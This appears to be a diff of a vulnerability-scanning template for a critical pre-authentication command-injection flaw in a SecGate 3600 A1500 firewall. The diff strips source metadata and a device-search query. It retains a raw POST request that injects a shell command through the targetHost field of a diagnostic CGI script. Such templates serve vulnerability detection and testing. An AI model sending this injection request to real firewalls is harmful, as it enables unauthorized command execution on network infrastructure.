@@ -3,14 +3,8 @@ info:
   name: 奇安信网神SecGate 3600 A1500 防火墙存在前台命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wiiinv4t4naob3bt
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wiiinv4t4naob3bt
-    fofa: body="sec_gate_image/login_02.gif"
 http:
 - raw:
   - 'POST /cgi-bin/sysTools/sysToolsDetectNet.cgi HTTP/1.1
@@ -28,7 +22,6 @@ http:
     Content-Type: application/x-www-form-urlencoded
 
     X-Requested-With: XMLHttpRequest
-
 
 
     targetHost=|ping|'
